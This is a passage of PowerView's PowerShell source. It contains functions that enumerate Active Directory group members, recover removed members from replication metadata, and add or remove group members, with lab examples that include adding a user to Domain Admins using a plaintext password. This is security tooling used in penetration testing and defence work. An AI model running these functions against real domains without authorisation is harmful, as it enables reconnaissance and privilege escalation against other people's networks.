MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember

.EXAMPLE

'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'dev\domain admins' | Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\domain admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # if we're doing manual recursion
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
<#
.SYNOPSIS

Returns information on group members that were removed from the specified
group identity. Accomplished by searching the linked attribute replication
metadata for the group using Get-DomainObjectLinkedAttributeHistory.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectLinkedAttributeHistory

.DESCRIPTION

Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
replication metadata for the specified group. These are cases where the
'Version' attribute of group member in the replication metadata is even.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMemberDeleted | Group-Object GroupDN

Count Name                      Group
----- ----                      -----
    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...

.EXAMPLE

Get-DomainGroupMemberDeleted "Domain Admins" -Domain testlab.local


GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T23:07:43Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T22:20:02Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 5
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.DomainGroupMemberDeleted

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {
<#
.SYNOPSIS

Adds a domain user (or group) to an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and added
to the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to add members to.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Adds harmj0y to 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
<#
.SYNOPSIS

Removes a domain user (or group) from an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and removed
from the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to remove members from.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Removes harmj0y from 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Removes harmj0y from 'Domain Admins' in the current domain using the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
